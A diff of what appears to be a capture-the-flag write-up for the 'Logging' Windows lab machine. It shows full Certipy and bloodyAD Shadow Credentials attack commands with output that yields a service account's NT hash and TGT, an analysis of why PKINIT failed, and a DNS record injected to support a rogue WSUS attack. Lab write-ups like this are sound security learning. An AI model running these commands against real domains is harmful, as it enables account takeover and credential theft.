@@ -346,28 +346,47 @@ With **GenericWrite** privileges over `MSA_HEALTH$`, we have the ability to modi
 
 By writing a custom certificate to the `msDS-KeyCredentialLink` attribute of `MSA_HEALTH$`, we can trick the Key Distribution Center (KDC) into issuing a Kerberos Ticket Granting Ticket (TGT) for the account using our attacker-controlled asymmetric key pair.
 
-## 3.1 Executing the Attack (bloodyAD)
+## 3.1 Executing the Attack via Certipy
 
-With a valid TGT cached, we utilize `bloodyAD` to orchestrate the Shadow Credentials attack.
+With a valid TGT cached, we utilize `Certipy` to orchestrate the Shadow Credentials attack.
 
-We use the `env KRB5CCNAME=svc_recovery.ccache` inline variable to force `bloodyAD` to authenticate via our cached Kerberos ticket (`-k`). The tool automatically generates an RSA key pair, writes the public key to the target's `msDS-KeyCredentialLink` attribute, and performs the PKINIT authentication to retrieve the target's TGT and NT hash.
+We use the `env KRB5CCNAME=svc_recovery.ccache` inline variable to force `Certipy` to authenticate via our cached Kerberos ticket (`-k -no-pass`). Critically, we explicitly specify both `-dc-host dc01.logging.htb` and `-dc-ip $targetIp` to ensure proper hostname validation during the PKINIT handshake.
 
 ```Bash
-# Inject Shadow Credentials and retrieve the NT hash
+# Execute Shadow Credentials attack with proper DNS validation
 ➜ env KRB5CCNAME=svc_recovery.ccache \
 fake_time dc01.logging.htb \
-bloodyAD -H dc01.logging.htb -d logging.htb \
-    -u 'svc_recovery' -k \
-    add shadowCredentials 'msa_health$'
+certipy shadow auto \
+    -u svc_recovery -k -no-pass \
+    -account 'msa_health$' \
+    -target dc01.logging.htb -dc-host dc01.logging.htb -dc-ip $targetIp
 
-...[snip]...
-[+] KeyCredential generated with following sha256 of RSA key: 8068eb20e242831db3046e20707b7bf5dfb663d2521d7db8be5e6f05498a2cfd
-[+] TGT stored in ccache file msa_health_vW.ccache
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
-NT: 603fc24ee01a9409f83c9d1d701485c5
+[*] Targeting user 'msa_health$'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'ee4c53ab50f84fdb82df149258963b92'
+[*] Adding Key Credential with device ID 'ee4c53ab50f84fdb82df149258963b92' to the Key Credentials for 'msa_health$'
+[*] Successfully added Key Credential with device ID 'ee4c53ab50f84fdb82df149258963b92' to the Key Credentials for 'msa_health$'
+[*] Authenticating as 'msa_health$' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'msa_health$@logging.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'msa_health.ccache'
+[*] Wrote credential cache to 'msa_health.ccache'
+[*] Trying to retrieve NT hash for 'msa_health$'
+[*] Restoring the old Key Credentials for 'msa_health$'
+[*] Successfully restored the old Key Credentials for 'msa_health$'
+[*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5
 ```
 
-**Result:** The attack successfully compromises the `MSA_HEALTH$` account, yielding its NT Hash (`603fc24ee01a9409f83c9d1d701485c5`) and a valid TGT (`msa_health_vW.ccache`), granting us full access to its privileges.
+**Result:** Certipy successfully negotiated the PKINIT authentication, extracted the NT Hash (`603fc24ee01a9409f83c9d1d701485c5`), and cached a valid TGT (`msa_health.ccache`), granting us full access to the service account.
+
+> Note: `bloodyAD` can also execute Shadow Credentials attacks, but reliability depends on DC configuration and Kerberos strictness. See Appendix-A for technical details on PKINIT failures.
 
 ---
 
@@ -1010,7 +1029,54 @@ The **Logging** machine presents a highly realistic Windows environment that hig
 
 # 8. Appendix
 
-## Appendix A: Alternative Privilege Escalation Path (Direct Domain Dominance)
+## Appendix A: Technical Deep-Dive - PKINIT Failures
+
+### Exploitation: Shadow Credentials via bloodyAD (with Caveats)
+
+Initially, `bloodyAD` was used to orchestrate the Shadow Credentials attack using our cached Kerberos ticket (`-k`).
+
+```Bash
+# Inject Shadow Credentials and retrieve the NT hash
+➜ env KRB5CCNAME=svc_recovery.ccache \
+fake_time dc01.logging.htb \
+bloodyAD --host dc01.logging.htb -d logging.htb \
+    -u 'svc_recovery' -k \
+    add shadowCredentials 'msa_health$'
+
+...[snip]...
+[+] KeyCredential generated with following sha256 of RSA key: 8068eb20e242831db3046e20707b7bf5dfb663d2521d7db8be5e6f05498a2cfd
+[+] TGT stored in ccache file msa_health_vW.ccache
+
+NT: 603fc24ee01a9409f83c9d1d701485c5
+```
+
+However, in persistent environments, the attack fails during the PKINIT authentication phase:
+
+```Bash
+➜ env KRB5CCNAME=svc_recovery.ccache \
+fake_time dc01.logging.htb \
+bloodyAD -H dc01.logging.htb -d logging.htb \
+        -u 'svc_recovery' -k \
+        add shadowCredentials 'msa_health$'
+
+[+] KeyCredential generated with following sha256 of RSA key: 0699bd312a8b60b08f48200619dea7ebcee1ec09d874dfffc094671f08ec875b
+[-] PKINIT failed on DC 10.129.62.234, you must find a Kerberos server with a certification authority!
+[-] Retry on a working KDC and do:
+badNTPKInit 'kerberos+pfx://logging.htb\msa_health$@10.129.62.234/?certdata=msa_health_Ww.pfx&timeout=350'
+[+] PKINIT PFX certificate saved at: msa_health_Ww.pfx
+...[snip]...
+kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)"
+```
+
+**Technical Analysis of the Failure**:
+
+The attack failed with `KDC_ERR_PADATA_TYPE_NOSUPP` during the PKINIT authentication phase. This occurred because `bloodyAD`'s underlying Kerberos library (`kerbad`) automatically resolved the DC to an IP address (`10.129.62.234`). During the TLS handshake, this caused a Subject Alternative Name (SAN) mismatch against the Domain Controller's certificate, prompting the KDC to reject our pre-authentication data.
+
+**Recommendation**: Use `Certipy` for Shadow Credentials attacks in strict Kerberos environments. `bloodyAD` remains useful for other LDAP-based attacks that don't require PKINIT.
+
+---
+
+## Appendix B: Alternative Privilege Escalation Path (Direct Domain Dominance)
 
 If you prefer a stealthier approach—or want to avoid catching an interactive reverse shell and manually resetting the Administrator password—you can modify the rogue WSUS payload to directly elevate an account we already control.
 
@@ -1065,7 +1131,7 @@ SMB         10.129.62.234    445    DC01             Administrator:500:aad3b435b
 
 ---
 
-## Appendix B: Remote Identity Pivot (TGT Extraction)
+## Appendix C: Remote Identity Pivot (TGT Extraction)
 
 Rather than performing certificate enrollment directly on the target host (which requires dropping more binaries or executing complex commands on the DC), we can "teleport" our identity back to our attacker machine. This method is cleaner and allows us to use our full suite of local tools.
 
@@ -1122,7 +1188,7 @@ With the identity active on our attacker machine, we use **bloodyAD** to perform
 ```bash
 ➜ fake_time dc01.logging.htb \
 env KRB5CCNAME=jaylee.clifton.ccache \
-bloodyAD -H dc01.logging.htb -d logging.htb \
+bloodyAD --host dc01.logging.htb -d logging.htb \
     -u 'jaylee.clifton' -k \
     add dnsRecord 'wsus' "10.10.16.25"
 [+] wsus has been successfully added
